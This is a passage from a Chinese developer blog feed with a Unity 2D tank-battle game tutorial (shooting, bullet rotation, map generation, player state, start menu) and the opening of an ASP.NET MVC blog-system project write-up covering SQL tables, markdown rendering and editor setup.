title="渲染优先级的问题"></a>渲染优先级的问题</h3><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/image-20211006002155224.png" alt></p><p>数值越大，等级越高，在最上层。</p><h2 id="坦克的攻击方法"><a href="#坦克的攻击方法" class="headerlink" title="坦克的攻击方法"></a>坦克的攻击方法</h2><p>需要编辑Player的脚本，先打开脚本</p><blockquote><p>目标：玩家点击空格键时实例化出来一颗子弹</p></blockquote><p>首先拿到子弹预制体的引用，然后定义按下空格键时的动作就行了</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">public GameObject BulletPrefab;  &#x2F;&#x2F;拿到子弹的预制体的引用&#x2F;**     坦克的攻击方法         *&#x2F;private void Attack()&#123;    if (Input.GetKeyDown(KeyCode.Space))    &#123;        Instantiate(BulletPrefab, transform.position, transform.rotation);        &#x2F;&#x2F;第一个参数是要生成的预制体，第二个是生成预制体时的位置，第三个时生成预制体的旋转    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这之后再将Attack函数添加到update函数里面（这里如果将该函数放在fixedupdate里面会产生按空格发不出来子弹的Bug），再将BulletPrefab的预制体赋一下值。</p><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/image-20211006120315415.png" alt></p><h3 id="子弹方向的问题解决"><a href="#子弹方向的问题解决" class="headerlink" title="子弹方向的问题解决"></a>子弹方向的问题解决</h3><p>因为Unity2D是左手坐标系，也就是说Z轴是从前到后的，所以说向左旋转是Vector3(0, 0, -90)。向右则相反。</p><p>上下则很简明，向下就是(±180°)都可以。</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">public Vector3 BulletEulerAngles;  &#x2F;&#x2F;定义子弹的欧拉角&#x2F;&#x2F; 子弹的角度应为：当前坦克的角度 + 子弹应该旋转的角度Instantiate(BulletPrefab, transform.position, Quaternion.Euler(transform.eulerAngles + BulletEulerAngles));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>把更改子弹的旋转角的位置放到坦克移动那里，也就是说，坦克朝哪个方向移动，子弹就往哪个方向射出。此处举出一例</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">if (x &gt; 0) &#x2F;&#x2F;向右&#123;    spriteRenderer.sprite &#x3D; tankSprite[1];    BulletEulerAngles &#x3D; new Vector3(0, 0, 90);&#125;else if (x &lt; 0) &#x2F;&#x2F;向左&#123;    spriteRenderer.sprite &#x3D; tankSprite[3];    BulletEulerAngles &#x3D; new Vector3(0, 0, -90); &#x2F;&#x2F;Z轴旋转-90°&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的正负90度也是涉及到了左手坐标系的问题，这里就不再写了。</p><h3 id="左手坐标系问题再解决"><a href="#左手坐标系问题再解决" class="headerlink" title="左手坐标系问题再解决"></a>左手坐标系问题再解决</h3><p>老师的那里的问题，我这还是标准的右手坐标系啊，所以我这里的旋转的角度还是顺时针旋转的，所以这里我的向右的方向的v3的坐标应该是(0,0,90)</p><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/image-20211006123946482.png" alt></p><h2 id="让子弹动起来"><a href="#让子弹动起来" class="headerlink" title="让子弹动起来"></a>让子弹动起来</h2><blockquote><p>目标：就是给子弹添加脚本，让子弹可以动起来。</p></blockquote><p>先给子弹添加脚本。</p><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/image-20211006125634280.png" alt></p><h2 id="给子弹添加时间间隔"><a href="#给子弹添加时间间隔" class="headerlink" title="给子弹添加时间间隔"></a>给子弹添加时间间隔</h2><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">private float timeVal;  &#x2F;&#x2F;创建计时器，控制子弹的发射速度void Update()&#123;    if (timeVal &gt;&#x3D; 0.4f)  &#x2F;&#x2F;设置子弹的CD为0.4    &#123;        Attack();    &#125;    else    &#123;        timeVal +&#x3D; Time.deltaTime;    &#125;&#125;.....&#x2F;**     坦克的攻击方法         *&#x2F;private void Attack()&#123;    if (Input.GetKeyDown(KeyCode.Space))    &#123;        &#x2F;&#x2F; 子弹的角度应为：当前坦克的角度 + 子弹应该旋转的角度        Instantiate(BulletPrefab, transform.position, Quaternion.Euler(transform.eulerAngles + BulletEulerAngles));        timeVal &#x3D; 0; &#x2F;&#x2F;攻击后计时器清零    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="给子弹添加触发器"><a href="#给子弹添加触发器" class="headerlink" title="给子弹添加触发器"></a>给子弹添加触发器</h2><blockquote><p>触发器生效的前提条件是他们的渲染层级相同，渲染层级就是我们前面改过的layer的属性。</p></blockquote><p>先创建碰撞器，碰撞器里面有一个触发器的属性，给他勾上就ok了。言如下图</p><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/image-20211006131028155.png" alt></p><h3 id="运动的一方-子弹-添加刚体属性"><a href="#运动的一方-子弹-添加刚体属性" class="headerlink" title="运动的一方(子弹)添加刚体属性"></a>运动的一方(子弹)添加刚体属性</h3><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/image-20211006131155243.png" alt></p><h3 id="标签的添加"><a href="#标签的添加" class="headerlink" title="标签的添加"></a>标签的添加</h3><p>如下图，添加标签</p><p><img src="/2021/10/05/Unity%E5%9D%A6%E5%85%8B%E5%A4%A7%E6%88%98%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/image-20211006132752386.png" alt></p><h3 id="制作空气墙"><a href="#制作空气墙" class="headerlink" title="制作空气墙"></a>制作空气墙</h3><p>就是边界问题，当子弹到达边界时自动销毁子弹</p><p>空气墙就是把那个障碍物复制一份(Ctrl + D)，然后移除他的精灵渲染器即可(sprite renderer).</p><h2 id="坦克的死亡问题"><a href="#坦克的死亡问题" class="headerlink" title="坦克的死亡问题"></a>坦克的死亡问题</h2><p>坦克如何死亡呢？在player.cs里面添加Die()方法，先整爆炸特效，死亡就是销毁当前的gameobject就行了</p><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">&#x2F;&#x2F;死亡Destroy(gameObject);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>现在看爆炸特效的消失，给爆炸特效添加脚本即可，脚本内容如下</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">using System.Collections;using System.Collections.Generic;using UnityEngine;public class Explosion : MonoBehaviour&#123;    &#x2F;&#x2F; Start is called before the first frame update    void Start()    &#123;        Destroy(gameObject, 0.167f);    &#125;    &#x2F;&#x2F; Update is called once per frame    void Update()    &#123;            &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="地图的实例化"><a href="#地图的实例化" class="headerlink" title="地图的实例化"></a>地图的实例化</h2><blockquote><p>目标：把整个地图的场景搭建起来。</p></blockquote><p>调地图大小的时候把相机改为正交模式即可更改Size，具体的操作流程<a href="https://blog.csdn.net/qq_41807260/article/details/87350003">如下链接</a>。</p><p>我这里的地图的纵向长大概为(16)，横向长大概为(24)。</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">using System.Collections;using System.Collections.Generic;using UnityEngine;public class MapCreator : MonoBehaviour&#123;    &#x2F;&#x2F;用来装饰地图初始化所需物体的数组    &#x2F;&#x2F;0.老家 1.墙 2.障碍 3.出生效果 4.河流 5.草 6.空气墙    public GameObject[] Items;    &#x2F;&#x2F;已经有东西的位置的列表    private List&lt;Vector3&gt; itemPositionList &#x3D; new List&lt;Vector3&gt;();    &#x2F;&#x2F;地图实例化    private void Awake()    &#123;        &#x2F;&#x2F;实例化老家        CreateItem(Items[0], new Vector3(0, -8, 0), Quaternion.identity);        &#x2F;&#x2F;用墙把家围起来        CreateItem(Items[1], new Vector3(-1, -8, 0), Quaternion.identity);        for (int i &#x3D; 0; i &lt; 3; i++)        &#123;            CreateItem(Items[1], new Vector3(i-1, -7, 0), Quaternion.identity);        &#125;        CreateItem(Items[1], new Vector3(1, -8, 0), Quaternion.identity);        &#x2F;&#x2F;实例化外围空气墙,        &#x2F;&#x2F;上下        for (float i &#x3D; -12; i &lt; 13; i++)        &#123;            CreateItem(Items[6], new Vector3(i, 9, 0), Quaternion.identity);        &#125;        for (float i &#x3D; -12; i &lt; 13; i++)        &#123;            CreateItem(Items[6], new Vector3(i, -9, 0), Quaternion.identity);        &#125;        &#x2F;&#x2F;左右        for (float i &#x3D; -8; i &lt; 9; i++)        &#123;            CreateItem(Items[6], new Vector3(13, i, 0), Quaternion.identity);        &#125;        for (float i &#x3D; -8; i &lt; 9; i++)        &#123;            CreateItem(Items[6], new Vector3(-13, i, 0), Quaternion.identity);        &#125;        &#x2F;&#x2F;实例化地图        &#x2F;&#x2F;1.墙        for (int i &#x3D; 0; i &lt; 60; i++)        &#123;            CreateItem(Items[1], CreateRandomPosition(), Quaternion.identity);        &#125;        &#x2F;&#x2F;2.障碍        for (int i &#x3D; 0; i &lt; 25; i++)        &#123;            CreateItem(Items[2], CreateRandomPosition(), Quaternion.identity);        &#125;        &#x2F;&#x2F;4.河流        for (int i &#x3D; 0; i &lt; 30; i++)        &#123;            CreateItem(Items[4], CreateRandomPosition(), Quaternion.identity);        &#125;        &#x2F;&#x2F;5.草        for (int i &#x3D; 0; i &lt; 25; i++)        &#123;            CreateItem(Items[5], CreateRandomPosition(), Quaternion.identity);        &#125;        &#x2F;&#x2F;初始化玩家        GameObject born &#x3D; Instantiate(Items[3], new Vector3(-2, -8.25f, 0), Quaternion.identity);        born.GetComponent&lt;Born&gt;().createPlayer &#x3D; true;        &#x2F;&#x2F;初始化敌人        CreateItem(Items[3], new Vector3(-12, 8, 0), Quaternion.identity);        CreateItem(Items[3], new Vector3(0, 8, 0), Quaternion.identity);        CreateItem(Items[3], new Vector3(12, 8, 0), Quaternion.identity);        InvokeRepeating(&quot;createEnemy&quot;, 4, 5);    &#125;    private void CreateItem(GameObject item, Vector3 itemPosition, Quaternion itemRotation)    &#123;        GameObject itemGo &#x3D; Instantiate(item, itemPosition, itemRotation);        itemGo.transform.SetParent(gameObject.transform);        &#x2F;&#x2F;生成的位置保存一下        itemPositionList.Add(itemPosition);        &#x2F;&#x2F;判断位置是否已经生成过item    &#125;    &#x2F;&#x2F;产生随机位置的方法    private Vector3 CreateRandomPosition()    &#123;        &#x2F;&#x2F;最外圈的地方不产生物品        while (true)        &#123;            Vector3 createPosition &#x3D; new Vector3(Random.Range(-11, 12), Random.Range(-7, 8), 0);            if (!HasItem(createPosition))            &#123;                return createPosition;            &#125;        &#125;    &#125;    &#x2F;&#x2F;判断位置是否已经实例化物品的方法    private bool HasItem(Vector3 createPosition)    &#123;        foreach (var item in itemPositionList)        &#123;            if (createPosition &#x3D;&#x3D; item)            &#123;                return true;            &#125;        &#125;        return false;    &#125;    &#x2F;&#x2F;产生敌人的方法    private void createEnemy()    &#123;        int num &#x3D; Random.Range(0, 3);        Vector3 EnemyPosition &#x3D; new Vector3();        if (num &#x3D;&#x3D; 0)        &#123;            EnemyPosition &#x3D; new Vector3(-12, 8, 0);        &#125;        else if (num &#x3D;&#x3D; 1)        &#123;            EnemyPosition &#x3D; new Vector3(0, 8, 0);        &#125;        else        &#123;            EnemyPosition &#x3D; new Vector3(12, 8, 0);        &#125;        CreateItem(Items[3], EnemyPosition, Quaternion.identity);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="玩家状态管理"><a href="#玩家状态管理" class="headerlink" title="玩家状态管理"></a>玩家状态管理</h2><p>脚本实现对玩家状态的一个管理</p><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">using System.Collections;using System.Collections.Generic;using UnityEngine;using UnityEngine.UI;public class PlayerManager : MonoBehaviour&#123;    &#x2F;&#x2F;玩家的生命    public int playerLife &#x3D; 3;    &#x2F;&#x2F;玩家的得分    public int playerScore &#x3D; 0;    &#x2F;&#x2F;玩家是否死亡    public bool isDead;    &#x2F;&#x2F;游戏是否失败    public bool isDefeat &#x3D; false;    &#x2F;&#x2F;出生特效的引用    public GameObject reLivePrefab;    &#x2F;&#x2F;两个ui得引用    public Text playerScoreText;    public Text playerLifeText;    &#x2F;&#x2F;拿到失败的图片    public GameObject imgGameOver;    private static PlayerManager instance;    public static PlayerManager Instance &#123; get &#x3D;&gt; instance; set &#x3D;&gt; instance &#x3D; value; &#125;    private void Awake()    &#123;        instance &#x3D; this;    &#125;    &#x2F;&#x2F; Start is called before the first frame update    void Start()    &#123;    &#125;    &#x2F;&#x2F; Update is called once per frame    void Update()    &#123;        &#x2F;&#x2F;游戏结束        if (isDefeat)        &#123;            imgGameOver.SetActive(true);            return;        &#125;        if (isDead)        &#123;            reLive();        &#125;        playerLifeText.text &#x3D; playerScore.ToString();        playerLifeText.text &#x3D; playerLife.ToString();    &#125;    &#x2F;&#x2F;复活    private void reLive()    &#123;        if (playerLife &#x3D;&#x3D; 0)        &#123;            &#x2F;&#x2F;没命了，回到主界面        &#125;        else        &#123;            GameObject born &#x3D; Instantiate(reLivePrefab, new Vector3(-2, -8.25f, 0), Quaternion.identity);            born.GetComponent&lt;Born&gt;().createPlayer &#x3D; true;            isDead &#x3D; false;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="制作开始界面，第一个场景"><a href="#制作开始界面，第一个场景" class="headerlink" title="制作开始界面，第一个场景"></a>制作开始界面，第一个场景</h2><p>直接先创建start scene。</p><p>然后直接拉ui，但是这里的选项有个脚本。</p><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">using System.Collections;using System.Collections.Generic;using UnityEngine;using UnityEngine.SceneManagement;public class Option : MonoBehaviour&#123;    private int chose &#x3D; 0;    public Transform onePlayer;    public Transform twoPlayer;    &#x2F;&#x2F; Start is called before the first frame update    void Start()    &#123;            &#125;    &#x2F;&#x2F; Update is called once per frame    void Update()    &#123;        &#x2F;&#x2F;获得输入        if (Input.GetKeyDown(KeyCode.W))        &#123;            chose &#x3D; 0;            transform.position &#x3D; onePlayer.position;        &#125;        if (Input.GetKeyDown(KeyCode.S))        &#123;            chose &#x3D; 1;            transform.position &#x3D; twoPlayer.position;        &#125;        &#x2F;&#x2F;更换场景        if (chose &#x3D;&#x3D; 0 &amp;&amp; Input.GetKeyDown(KeyCode.Space))        &#123;            SceneManager.LoadScene(&quot;GameScene&quot;);        &#125;        else if (chose &#x3D;&#x3D; 1 &amp;&amp; Input.GetKeyDown(KeyCode.Space))        &#123;            SceneManager.LoadScene(&quot;GameScene&quot;);        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加音效"><a href="#添加音效" class="headerlink" title="添加音效"></a>添加音效</h2><p>使用AudioClip与AudioSource组件联动即可，非常简单。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 项目 </tag>
            
            <tag> 开发文档 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASP.NET博客系统&amp;网抑云项目文档</title>
      <link href="2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3/"/>
      <url>2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="ASP-NET博客系统项目文档"><a href="#ASP-NET博客系统项目文档" class="headerlink" title="ASP.NET博客系统项目文档"></a>ASP.NET博客系统项目文档</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想做这个东西很久了，主要是想尝试一下MVC的网站开发模式，看看网站从无到有的开发的流程。今天开始可以开始自己实现一个了，我会把开发的过程记在这个文档里面，留作以后的参考。</p><blockquote><p>注:</p><ol><li>本系统暂时只会实现个人发表博客，登录功能主要是用于发表文章更新时用的，相当于一个后台的admin管理界面。</li></ol></blockquote><h2 id="一、前端布局"><a href="#一、前端布局" class="headerlink" title="一、前端布局"></a>一、前端布局</h2><p>这里我主要想参考的是下面这个hexo的博客的布局来搞，就是一个初级的练手的项目，不想搞得太深，没什么必要也。</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3/image-20211004210733904.png" alt></p><p>就是最上面是一个导航栏，再往下一点有个轮播图，再向下是个三栏式的博客，左边和右边是小工具的地方，中间放文章的标题与摘要，可以设置封面，不设置封面的话自动加载默认的图片。</p><h2 id="二、数据库设置"><a href="#二、数据库设置" class="headerlink" title="二、数据库设置"></a>二、数据库设置</h2><p>两个表，一个表中存放用户的相关信息，另一个表中存放发表的博客文章的相关信息。</p><h3 id="1-用户信息表"><a href="#1-用户信息表" class="headerlink" title="1. 用户信息表"></a>1. 用户信息表</h3><p>用户名、密码、邮箱</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>userinfo<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span>Id<span class="token punctuation">]</span> <span class="token keyword">INT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>     <span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>     <span class="token punctuation">[</span>password<span class="token punctuation">]</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>     <span class="token punctuation">[</span>email<span class="token punctuation">]</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-文章相关表"><a href="#2-文章相关表" class="headerlink" title="2. 文章相关表"></a>2. 文章相关表</h3><p>文章id(唯一)、文章cover、文章标题、文章路径(并不准备把文章存在数据库里面)。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>AticleInfo<span class="token punctuation">]</span> <span class="token punctuation">(</span>    <span class="token punctuation">[</span>Id<span class="token punctuation">]</span>           <span class="token keyword">INT</span>           <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span>articlecover<span class="token punctuation">]</span> <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span>articletitle<span class="token punctuation">]</span> <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>  <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span>articlepath<span class="token punctuation">]</span>  <span class="token keyword">VARCHAR</span> <span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>   <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span>articlesummary<span class="token punctuation">]</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>     <span class="token punctuation">[</span>articlewordnum<span class="token punctuation">]</span> <span class="token keyword">INT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>     <span class="token punctuation">[</span>articlesticky<span class="token punctuation">]</span> <span class="token keyword">INT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>     <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token keyword">CLUSTERED</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>Id<span class="token punctuation">]</span> <span class="token keyword">ASC</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、文章显示"><a href="#三、文章显示" class="headerlink" title="三、文章显示"></a>三、文章显示</h2><p>对文章的显示我用的时一个js的一个插件，在github上面找的。</p><p><a href="https://github.com/markedjs/marked">https://github.com/markedjs/marked</a></p><p>可以直接引入script</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--调用markdown渲染脚本--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/marked/marked.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在js中调用使用的方法是</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token function">marked</span><span class="token punctuation">(</span><span class="token string">'# Marked in the browser\n\nRendered by **marked**.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是这个也许有点不美观，后期可能会换个好看的插件，现在就这了。</p><h3 id="1-把读文章做成接口"><a href="#1-把读文章做成接口" class="headerlink" title="1. 把读文章做成接口"></a>1. 把读文章做成接口</h3><p>这里我把从文件里面读取文章的功能做成了一个接口，把接口就写在了HomeController里面了，未来如果有需要的话，可能会把接口挪到专门的ApiController里面，做成一个专门的接口控制器</p><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">&#x2F;&#x2F;APIpublic ActionResult APIGetArticle(int? id)&#123;    AticleInfo articleInfo &#x3D; db.AticleInfo.Find(id);    string path &#x3D; articleInfo.articlepath;    path &#x3D; Request.MapPath(path);  &#x2F;&#x2F;转换为相对路径    string readContents &#x3D; System.IO.File.ReadAllText(path, Encoding.UTF8);    return Content(readContents);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、文章撰写"><a href="#四、文章撰写" class="headerlink" title="四、文章撰写"></a>四、文章撰写</h2><p>​    使用插件<code>editormd</code>，这里有两种选择，第一种是把editor组件的代码下载到本地，第二就是使用在线的镜像，这里为了稳定采用第一种方案。</p><p>​    先把代码下载下来，<a href="https://pandao.github.io/editor.md/">下载地址</a>，然后把里面的文件解压到一个文件夹里面，文件夹这里我命名为了editormd，因为Script文件夹里面的文件太多了，非常讨厌，所以这里我把这个插件放在了Content目录下面了。</p><p>​    使用方法也很简单，这里直接把他这个插件的官方网站上的代码修改一下即可使用到我们的ASP项目</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">@&#123;    Layout = "~/Views/Shared/_AdminLayout.cshtml";&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../Content/editormd/css/editormd.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.bootcss.com/jquery/1.11.3/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>~/Content/editormd/editormd.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">        <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> editor <span class="token operator">=</span> <span class="token function">editormd</span><span class="token punctuation">(</span><span class="token string">"editor"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// width  : "100%",</span>                <span class="token comment">// height : "100%",</span>                path<span class="token operator">:</span> <span class="token string">"../Content/editormd/lib/"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token 